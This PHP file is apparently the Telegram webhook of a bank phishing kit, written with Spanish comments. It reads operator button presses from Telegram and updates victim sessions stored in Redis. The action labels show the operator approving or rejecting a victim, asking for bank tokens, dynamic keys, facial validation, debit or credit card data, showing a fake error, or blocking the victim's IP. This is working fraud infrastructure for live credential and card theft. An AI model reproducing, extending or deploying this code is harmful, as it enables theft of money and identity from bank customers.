<?php
// api/webhook.php

header('Content-Type: application/json; charset=utf-8');

// Función auxiliar para comunicarse con Redis usando la variable REDIS_URL
function upstash_redis($command, array $args = []) {
    $redisUrl = getenv('REDIS_URL');
    if (!$redisUrl) return null;
    
    $parsed = parse_url($redisUrl);
    $scheme = $parsed['scheme'] ?? 'redis';
    $host = $parsed['host'] ?? '';
    $port = $parsed['port'] ?? 6379;
    // Extraer contraseña o token
    $pass = $parsed['pass'] ?? ($parsed['user'] ?? '');
    
    if (empty($host)) return null;

    // Si la URL empieza con rediss://, usamos SSL/TLS
    $prefix = ($scheme === 'rediss') ? 'ssl://' : '';
    
    $fp = @fsockopen($prefix . $host, $port, $errno, $errstr, 3.0);
    if (!$fp) return null;
    
    // Autenticar si hay contraseña/token
    if (!empty($pass)) {
        $authCmd = "*2\r\n$4\r\nAUTH\r\n$" . strlen($pass) . "\r\n" . $pass . "\r\n";
        fwrite($fp, $authCmd);
        fgets($fp); // Leer respuesta del AUTH
    }
    
    // Construir comando en formato RESP (Redis Serialization Protocol)
    $allArgs = array_merge([$command], $args);
    $cmd = "*" . count($allArgs) . "\r\n";
    foreach ($allArgs as $arg) {
        $argStr = (string)$arg;
        $cmd .= "$" . strlen($argStr) . "\r\n" . $argStr . "\r\n";
    }
    
    fwrite($fp, $cmd);
    
    // Leer la respuesta de Redis
    $response = fgets($fp);
    if ($response === false) {
        fclose($fp);
        return null;
    }
    
    $replyType = $response[0];
    $reply = trim(substr($response, 1));
    
    if ($replyType === '$') {
        $length = (int)$reply;
        if ($length === -1) {
            fclose($fp);
            return null; // Nil / No encontrado
        }
        $data = fread($fp, $length);
        fgets($fp); // Consumir los bytes \r\n finales
        fclose($fp);
        return $data;
    } elseif ($replyType === '+') {
        fclose($fp);
        return $reply; // Ejemplo: "OK"
    }
    
    fclose($fp);
    return null;
}

// 1. Obtener el cuerpo de la petición de Telegram
$content = file_get_contents("php://input");
$update  = json_decode($content, true);

if (!$update || !isset($update['callback_query'])) {
    http_response_code(200);
    echo json_encode(["status" => "ignored"]);
    exit;
}

$cb     = $update['callback_query'];
$cbData = $cb['data'] ?? '';
$cbqId  = $cb['id'] ?? '';
$chatId = $cb['message']['chat']['id'] ?? '';
$msgId  = $cb['message']['message_id'] ?? '';

$botToken = getenv('bot_token') ?: getenv('TELEGRAM_BOT_TOKEN');

if ($cbqId && $botToken) {
    @file_get_contents("https://api.telegram.org/bot{$botToken}/answerCallbackQuery?callback_query_id={$cbqId}");
}

// 2. Parsear datos del botón: accion_step_sessionId
if (!preg_match('/^(\w+)_(.+)_(sess_[a-zA-Z0-9_]+)$/', $cbData, $m)) {
    http_response_code(200);
    exit;
}

$action = $m[1];
$step   = $m[2];
$sessId = $m[3];

// 3. Obtener sesión desde Redis
$rawSession = upstash_redis('GET', [$sessId]);
if ($rawSession) {
    $sessData = json_decode($rawSession, true) ?: [];

    if (($sessData['status'] ?? '') === 'pending') {
        $sessData['status'] = 'completed';
        $sessData['action'] = $action;

        $actionLabels = [
            'aprobar'  => '✅ APROBADO',
            'rechazar' => '❌ RECHAZADO',
            'token'    => '🔐 SOLICITAR TOKEN',
            'dinamica' => '💳 SOLICITAR CLAVE DINÁMICA',
            'face'     => '👤 SOLICITAR VALIDACIÓN FACIAL',
            'debito'   => '💳 SOLICITAR TARJETA DÉBITO',
            'credito'  => '💰 SOLICITAR TARJETA CRÉDITO',
            '923'      => '⚠️ ENVIAR ERROR 923',
            'banip'    => '🚫 BLOQUEAR IP'
        ];
        
        $actionText   = $actionLabels[$action] ?? 'Acción realizada';
        $originalText = $sessData['messageText'] ?? ($cb['message']['text'] ?? '');
        $newText      = $originalText . "\n\n<b>" . $actionText . "</b>";

        if ($botToken) {
            $editBody = http_build_query([
                'chat_id'      => $chatId,
                'message_id'   => $msgId,
                'text'         => $newText,
                'parse_mode'   => 'HTML',
                'reply_markup' => json_encode(['inline_keyboard' => []])
            ]);

            $ch = curl_init("https://api.telegram.org/bot{$botToken}/editMessageText");
            curl_setopt_array($ch, [
                CURLOPT_POST           => true,
                CURLOPT_POSTFIELDS     => $editBody,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT        => 10,
                CURLOPT_SSL_VERIFYPEER => true
            ]);
            curl_exec($ch);
            curl_close($ch);
        }

        // Guardar sesión actualizada en Redis con expiración de 1 hora (3600 seg)
        upstash_redis('SET', [$sessId, json_encode($sessData), 'EX', 3600]);
    }
}

http_response_code(200);
echo json_encode(["status" => "ok"]);